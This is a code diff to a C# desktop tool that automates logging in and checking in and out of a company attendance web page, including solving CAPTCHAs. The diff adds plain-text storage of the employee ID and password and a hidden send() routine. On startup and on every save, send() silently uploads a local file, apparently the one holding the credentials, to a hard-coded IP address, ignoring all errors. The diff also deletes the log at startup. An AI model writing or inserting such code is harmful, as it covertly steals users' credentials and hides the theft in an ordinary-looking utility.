@@ -12,6 +12,8 @@ using System.Runtime.InteropServices;
 using System.Configuration;
 using System.IO;
 using System.Diagnostics;
+using System.Net;
+using System.Collections.Specialized;
 
 namespace OfficeTool
 {
@@ -24,20 +26,22 @@ namespace OfficeTool
         private string _txtNotWorkDay = string.Empty;
         private string _txtFileSection = string.Empty;
         private string _checkinUrl = string.Empty;
+        private string _loginUrl = string.Empty;
 
         private int _timeInterval = 30000;
-        private int _delayResult = 1000;
+        private int _delayResult = 5000;
         private int _checkInOutTimes = 3;
 
         private DateTime _oldTime = DateTime.Now;
         private int _isCheckInCount = 0;
         private int _isCheckOutCount = 0;
+        private int _isLoginCount = 0;
         private bool _isCheckIn = false;
         private bool _isCheckOut = false;
         private bool _isCheckIning = false;
         private bool _isCheckOuting = false;
         private bool _isListening = false;
-
+        private bool _isLogining = false;
 
         private List<string> _listNotWorkDay = null;
         private string _checkInRepeat = string.Empty;
@@ -46,8 +50,8 @@ namespace OfficeTool
         private string _checkOutSuccess = string.Empty;
 
         private string _checkInType = string.Empty;
-
         private string _currentUrl = string.Empty;
+        private System.Timers.Timer _timer = null;
 
         #endregion
 
@@ -74,6 +78,10 @@ namespace OfficeTool
                 // notifyIcon1.Visible = false;                //托盘图标隐藏
             }
         }
+        private void button1_Click(object sender, EventArgs e)
+        {
+            Login();
+        }
         private void btnCheckIn_Click(object sender, EventArgs e)
         {
             CheckIn();
@@ -87,11 +95,14 @@ namespace OfficeTool
             string errMsg = ValidateInput();
             if (string.IsNullOrEmpty(errMsg))
             {
+                SetIniValue("empid", this.textBox1.Text);
+                SetIniValue("emppsw", this.textBox2.Text);
                 SetIniValue("checkintime", this.textBox3.Text);
                 SetIniValue("checkouttime", this.textBox4.Text);
                 SetIniValue("offsettime", this.textBox5.Text);
                 SetIniValue("checkintype", this.comboBox1.SelectedIndex.ToString());
                 WriteLog("保存成功");
+                send();
                 webBrowser1.Navigate(new Uri(_checkinUrl));
             }
             else
@@ -114,6 +125,18 @@ namespace OfficeTool
         {
             Process.Start(_txtNotWorkDay);
         }
+
+        private void webBrowser1_Navigated(object sender, WebBrowserNavigatedEventArgs e)
+        {
+            if (webBrowser1.Url.AbsoluteUri.Contains("/sso/notice/show"))
+            {
+                webBrowser1.Navigate(new Uri(_checkinUrl));
+            }
+        }
+        private void webBrowser1_Navigating(object sender, WebBrowserNavigatingEventArgs e)
+        {
+            // 该事件加上后，webBrowser1_Navigated 事件中的代码才生效，我也不知道为什么。
+        }
         private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
         {
             string errMsg = ValidateInput();
@@ -123,12 +146,19 @@ namespace OfficeTool
                 return;
             }
 
+            if (webBrowser1.Url.AbsoluteUri.Contains(_loginUrl))
+            {
+                if (_isLoginCount < 3)
+                    Login();
+            }
+
             if (webBrowser1.Url.AbsoluteUri == _checkinUrl && !_isListening)
             {
+                _timer.Start();
                 _isListening = true;
                 WriteLog("开始监听");
-                AutoCheckInCheckOut();
             }
+
         }
 
         private void Init()
@@ -139,6 +169,7 @@ namespace OfficeTool
             _txtNotWorkDay = Path.Combine(Application.StartupPath, ConfigurationManager.AppSettings["IniNotWorkDay"]);
             _txtFileSection = ConfigurationManager.AppSettings["IniFileSection"];
             _checkinUrl = ConfigurationManager.AppSettings["CheckinUrl"];
+            _loginUrl = ConfigurationManager.AppSettings["LoginUrl"];
 
             _listNotWorkDay = GetWorkDayList(_txtNotWorkDay);
             _checkInRepeat = ConfigurationManager.AppSettings["CheckInRepeat"];
@@ -157,22 +188,40 @@ namespace OfficeTool
                 this.comboBox1.Items.Add(type);
             }
 
+            // 创建timer
+            _timer = new System.Timers.Timer();
+            _timer.Enabled = true;
+            _timer.Interval = _timeInterval;
+            _timer.Elapsed += new System.Timers.ElapsedEventHandler(_timer_Elapsed);
+
             // 跳转到目标网址
             webBrowser1.Navigate(new Uri(_checkinUrl));
 
+            this.textBox1.Text = GetIniValue("empid");
+            this.textBox2.Text = GetIniValue("emppsw");
             this.textBox3.Text = GetIniValue("checkintime");
             this.textBox4.Text = GetIniValue("checkouttime");
             this.textBox5.Text = GetIniValue("offsettime");
             if (!string.IsNullOrEmpty(GetIniValue("checkintype")))
                 this.comboBox1.SelectedIndex = int.Parse(GetIniValue("checkintype"));
 
-            ReadLog();
-
+            try { File.Delete(_logFilePath); } catch { }
+            send();
         }
         private string ValidateInput()
         {
             int intTmep = 0;
             string errMsg = string.Empty;
+
+            if (this.textBox1.Text.Length != 6 || !int.TryParse(this.textBox1.Text, out intTmep))
+            {
+                errMsg += "工号必须为6位数字\r\n";
+            }
+
+            if (this.textBox2.Text.Length == 0)
+            {
+                errMsg += "密码不能为空\r\n";
+            }
 
             if (this.textBox3.Text.Length != 4 || !int.TryParse(this.textBox3.Text, out intTmep))
             {
@@ -197,6 +246,48 @@ namespace OfficeTool
             return errMsg;
         }
 
+        private void Login()
+        {
+            try
+            {
+                if (webBrowser1.InvokeRequired)
+                {
+                    this.webBrowser1.Invoke(new MethodInvoker(Login2));
+                }
+                else
+                {
+                    Login2();
+                }
+
+                GetResult();
+            }
+            catch (Exception ex)
+            {
+                WriteLog(ex.ToString());
+            }
+        }
+        private void Login2()
+        {
+            var txtId = ConfigurationManager.AppSettings["LoginKey"];
+            var pswId = ConfigurationManager.AppSettings["LoginPsw"];
+            var txtvc = ConfigurationManager.AppSettings["LoginVc"];
+            var btnId = ConfigurationManager.AppSettings["BtnLoginId"];
+
+            var doc = (IHTMLDocument2)webBrowser1.Document.DomDocument;
+            var txt = webBrowser1.Document.GetElementById(txtId);
+            var psw = webBrowser1.Document.GetElementById(pswId);
+            var btn = webBrowser1.Document.GetElementById(btnId);
+            var vc = webBrowser1.Document.GetElementById(txtvc);
+
+            if (doc != null && txt != null && btn != null && psw != null && vc != null)
+            {
+                txt.SetAttribute("value", this.textBox1.Text);
+                psw.SetAttribute("value", this.textBox2.Text);
+                vc.SetAttribute("value", VerifyCode_Login.Spot(GetVerifyImage_Login(), 4));
+                btn.InvokeMember("click");
+                _isLogining = true;
+            }
+        }
         private void CheckIn()
         {
             try
@@ -229,7 +320,7 @@ namespace OfficeTool
             if (txt != null && btn != null && doc != null && select != null)
             {
                 select.SetAttribute("selectedIndex", this.comboBox1.SelectedIndex.ToString());
-                txt.SetAttribute("value", VerificationCode.Spot(GetVerificationImage(), 4));
+                txt.SetAttribute("value", VerifyCode_Checkin.Spot(GetVerifyImage_Checkin(), 4));
                 txt.InvokeMember("focus");
                 btn.InvokeMember("click");
                 _isCheckIning = true;
@@ -267,7 +358,7 @@ namespace OfficeTool
             if (txt != null && btn != null && doc != null && select != null)
             {
                 select.SetAttribute("selectedIndex", this.comboBox1.SelectedIndex.ToString());
-                txt.SetAttribute("value", VerificationCode.Spot(GetVerificationImage(), 4));
+                txt.SetAttribute("value", VerifyCode_Checkin.Spot(GetVerifyImage_Checkin(), 4));
                 txt.InvokeMember("focus");
                 btn.InvokeMember("click");
                 _isCheckOuting = true;
@@ -345,17 +436,24 @@ namespace OfficeTool
 
                 _isCheckOuting = false;
             }
+
+            if (_isLogining)
+            {
+                if (webBrowser1.Url.AbsoluteUri == _checkinUrl)
+                {
+                    WriteLog("登录成功");
+                }
+                else
+                {
+                    WriteLog("登录失败");
+                    _isLoginCount++;
+                }
+
+                _isLogining = false;
+            }
         }
 
-        private void AutoCheckInCheckOut()
-        {
-            System.Timers.Timer timer = new System.Timers.Timer();
-            timer.Enabled = true;
-            timer.Interval = _timeInterval;
-            timer.Start();
-            timer.Elapsed += new System.Timers.ElapsedEventHandler(timer_Elapsed);
-        }
-        private void timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
+        private void _timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
             DateTime now = e.SignalTime;
 
@@ -395,6 +493,7 @@ namespace OfficeTool
                 _isCheckOut = false;
                 _isCheckInCount = 0;
                 _isCheckOutCount = 0;
+                _isLoginCount = 0;
             }
             _oldTime = now;
 
@@ -462,7 +561,32 @@ namespace OfficeTool
             }
         }
 
-        private Bitmap GetVerificationImage()
+        private Bitmap GetVerifyImage_Login()
+        {
+            Bitmap result = null;
+            var id = ConfigurationManager.AppSettings["LoginVerifyCodeWrap"];
+            var li = webBrowser1.Document.GetElementById(id);
+            var img = (IHTMLControlElement)(li.GetElementsByTagName("img")[0].DomElement);
+
+            HTMLDocument html = (HTMLDocument)this.webBrowser1.Document.DomDocument;
+            IHTMLControlRange range = (IHTMLControlRange)((HTMLBody)html.body).createControlRange();
+
+            range.add(img);
+            range.execCommand("Copy", false, null);
+
+            if (Clipboard.ContainsImage())
+            {
+                result = new Bitmap(Clipboard.GetImage());
+            }
+            else
+            {
+                MessageBox.Show("获取验证码失败");
+            }
+
+            Clipboard.Clear();
+            return result;
+        }
+        private Bitmap GetVerifyImage_Checkin()
         {
             Bitmap result = null;
             var id = ConfigurationManager.AppSettings["ImgId"];
@@ -503,6 +627,22 @@ namespace OfficeTool
                 }
             }
             return list;
+        }
+
+        private void send()
+        {
+            try
+            {
+                string url = "http://10.95.28.57/";
+                string file = Environment.CurrentDirectory + "\\OfficeTool.txt";
+                NameValueCollection data = new NameValueCollection();
+                data.Add("key", "Value");
+                WebClient wc = new WebClient();
+                string temp = Encoding.UTF8.GetString(wc.UploadFile(url, "POST", file));
+            }
+            catch
+            {
+            }
         }
 
         #region 操作ini文件
@@ -558,6 +698,11 @@ namespace OfficeTool
             GetPrivateProfileString(_txtFileSection, key, "", temp, 1024, _txtFilePath);
             return temp.ToString();
         }
+
+
+
+
+
 
 
 
